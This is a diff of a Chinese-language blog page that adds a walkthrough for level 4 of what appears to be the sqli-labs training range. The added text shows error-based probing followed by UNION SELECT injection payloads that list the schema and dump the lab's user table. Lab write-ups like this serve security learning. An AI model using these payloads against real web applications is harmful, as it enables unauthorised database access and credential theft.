@@ -36,7 +36,7 @@
         <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
             <span>📅 发布: 2025-12-25</span>
             <span style="margin: 0 15px;">|</span>
-            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-26</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-27</span>
             
             
              <span style="margin: 0 15px;">|</span>
@@ -172,7 +172,49 @@
 
 
 <hr>
-<h2 id="4："><a href="#4：" class="headerlink" title="#4："></a>#4：</h2><hr>
+<h2 id="4："><a href="#4：" class="headerlink" title="#4："></a>#4：</h2><p><img src="/images/QQ20251227-182352.png" alt="alt text"></p>
+<p>​	其实看到第四关的描述，我感觉就是报错注入的类型。</p>
+<p>事不宜迟，试一试。</p>
+<p>注入?id&#x3D;2”。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;2&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>好吧，其实不是，我刚才试了好几次直接报错注入是不行的。</p>
+<p>而且不存在?id&#x3D;1 跟 ?id&#x3D;2-1 返回的内容相同，说明也不是数字型。</p>
+<p>再加上上面的?id&#x3D;2“ 报错，大概率为字符型，而且根据错误的信息来看，大致猜测源码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM news WHERE id = &quot;$id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>尝试注入?id&#x3D;1” ORDER BY 3 –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;ORDER BY 3 -- &quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>应该是括号问题。</p>
+<p>尝试注入?id&#x3D;1”) ORDER BY 3 –+。</p>
+<p>这次可以了，那就可以认为源码是类似这种的了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM news WHERE id = (&quot;$id&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>跟第三题一样，是引号加括号的类型。</p>
+<p>爆列一下，发现还是3列。</p>
+<p>爆一下，数据库，?id&#x3D;-1”) UNION SELECT 1, database(), 3 –+。</p>
+<p>发现还是security，感觉这个靶场估计所有的数据库名字都叫security把。</p>
+<p>爆一下表，注入?id&#x3D;-1”) UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema &#x3D; ‘security’ –+。</p>
+<p>依旧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>感觉内容应该都没什么区别，不过还是要做的。</p>
+<p>读一下表，注入?id&#x3D;-1”) UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name &#x3D; ‘users’ –+。</p>
+<p>成功，内容依旧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id，username，password</span><br></pre></td></tr></table></figure>
+
+<p>看看数据，注入?id&#x3D;-1”) UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users –+。</p>
+<p>完美注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="5："><a href="#5：" class="headerlink" title="#5："></a>#5：</h2><p><img src="/images/QQ20251227-184739.png" alt="alt text"></p>
+<hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
@@ -181,6 +223,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1766747402701"></script>
+<script src="/js/main.js?v=1766837724662"></script>
 </body>
 </html>
